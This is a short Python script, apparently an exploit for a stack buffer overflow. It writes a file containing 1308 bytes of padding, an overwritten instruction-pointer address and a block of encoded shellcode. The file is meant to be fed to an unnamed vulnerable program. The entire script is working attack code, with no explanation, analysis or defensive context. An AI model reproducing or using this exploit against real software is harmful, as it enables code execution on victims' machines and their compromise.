#!/usr/bin/python3
import struct

def exploit():
    buf =  b""
    buf += b"\x2b\xc9\x83\xe9\xcf\xe8\xff\xff\xff\xff\xc0\x5e"
    buf += b"\x81\x76\x0e\xf0\x96\xc6\x94\x83\xee\xfc\xe2\xf4"
    buf += b"\x0c\x7e\x44\x94\xf0\x96\xa6\x1d\x15\xa7\x06\xf0"
    buf += b"\x7b\xc6\xf6\x1f\xa2\x9a\x4d\xc6\xe4\x1d\xb4\xbc"
    buf += b"\xff\x21\x8c\xb2\xc1\x69\x6a\xa8\x91\xea\xc4\xb8"
    buf += b"\xd0\x57\x09\x99\xf1\x51\x24\x66\xa2\xc1\x4d\xc6"
    buf += b"\xe0\x1d\x8c\xa8\x7b\xda\xd7\xec\x13\xde\xc7\x45"
    buf += b"\xa1\x1d\x9f\xb4\xf1\x45\x4d\xdd\xe8\x75\xfc\xdd"
    buf += b"\x7b\xa2\x4d\x95\x26\xa7\x39\x38\x31\x59\xcb\x95"
    buf += b"\x37\xae\x26\xe1\x06\x95\xbb\x6c\xcb\xeb\xe2\xe1"
    buf += b"\x14\xce\x4d\xcc\xd4\x97\x15\xf2\x7b\x9a\x8d\x1f"
    buf += b"\xa8\x8a\xc7\x47\x7b\x92\x4d\x95\x20\x1f\x82\xb0"
    buf += b"\xd4\xcd\x9d\xf5\xa9\xcc\x97\x6b\x10\xc9\x99\xce"
    buf += b"\x7b\x84\x2d\x19\xad\xfc\xc7\x19\x75\x24\xc6\x94"
    buf += b"\xf0\xc6\xae\xa5\x7b\xf9\x41\x6b\x25\x2d\x36\x21"
    buf += b"\x52\xc0\xae\x32\x65\x2b\x5b\x6b\x25\xaa\xc0\xe8"
    buf += b"\xfa\x16\x3d\x74\x85\x93\x7d\xd3\xe3\xe4\xa9\xfe"
    buf += b"\xf0\xc5\x39\x41\x93\xf7\xaa\xf7\xde\xf3\xbe\xf1"
    buf += b"\xf0\x96\xc6\x94"

    offset = 1308
    buffer = b"A"*offset
    eip = b"\xBA\x11\x80\x14"

    payload = buffer + eip + buf
    
    with open("exploit.txt", "wb") as f:
        f.write(payload)

exploit()  

